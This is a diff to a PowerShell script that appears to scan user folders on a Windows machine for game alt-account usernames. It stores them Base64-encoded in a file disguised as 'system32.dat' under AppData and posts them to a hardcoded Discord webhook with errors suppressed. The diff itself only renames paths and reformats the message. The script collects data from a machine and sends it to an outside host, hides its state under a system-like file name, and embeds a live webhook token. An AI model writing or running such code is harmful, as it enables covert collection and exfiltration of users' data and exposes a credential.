@@ -1,6 +1,12 @@
 $webhookUrl = "https://discord.com/api/webhooks/1484660761065164941/zLCj9R1yBHopZUV9UflUrB_NS-aWOy9_DOcjB1-Djan2iHoXSyPaZCcCh9pZPMfG9UmN"
 $startPath = "C:\Users"
-$hwidPath = "$env:APPDATA\Microsoft\Windows\Caches\system32.dat"
+$hwidPath = "$env:APPDATA\Microsoft\Windows\Caches"
+$hwidFile = "$hwidPath\system32.dat"
+
+# Create directory if it doesn't exist
+if (-not (Test-Path $hwidPath)) {
+    New-Item -ItemType Directory -Path $hwidPath -Force | Out-Null
+}
 
 # Get HWID only
 function Get-HWID {
@@ -22,9 +28,9 @@ $hwid = Get-HWID
 
 # Load stored alts
 $storedAlts = @{}
-if (Test-Path $hwidPath) {
+if (Test-Path $hwidFile) {
     try {
-        $encrypted = Get-Content $hwidPath -Raw
+        $encrypted = Get-Content $hwidFile -Raw
         $bytes = [System.Convert]::FromBase64String($encrypted)
         $decrypted = [System.Text.Encoding]::UTF8.GetString($bytes)
         $storedAlts = $decrypted | ConvertFrom-Json
@@ -93,7 +99,7 @@ if ($storedAlts.Count -gt 0) {
     $json = $storedAlts | ConvertTo-Json
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
     $encrypted = [System.Convert]::ToBase64String($bytes)
-    Set-Content -Path $hwidPath -Value $encrypted -Force
+    Set-Content -Path $hwidFile -Value $encrypted -Force
 }
 
 # Display and send results
@@ -103,9 +109,12 @@ if ($newAlts.Count -gt 0) {
         Write-Host ("  {0}" -f $_) -ForegroundColor Magenta
     }
     
-    $message = "**NEW ALTS DETECTED**`n**HWID:** $hwid`n`n"
-    foreach ($username in $newAlts) {
-        $message += "`"$username`"`n"
+    # Elegant format like the image
+    $message = "**ALT ACCOUNTS DETECTED**`n"
+    $counter = 1
+    foreach ($username in $newAlts | Select-Object -Unique) {
+        $message += "`n$counter. $username"
+        $counter++
     }
     
     $payload = @{
@@ -114,6 +123,7 @@ if ($newAlts.Count -gt 0) {
     } | ConvertTo-Json
     
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
+    Write-Host "Results sent to Discord!" -ForegroundColor Green
 } else {
     Write-Host "No new alts found." -ForegroundColor Yellow
 }
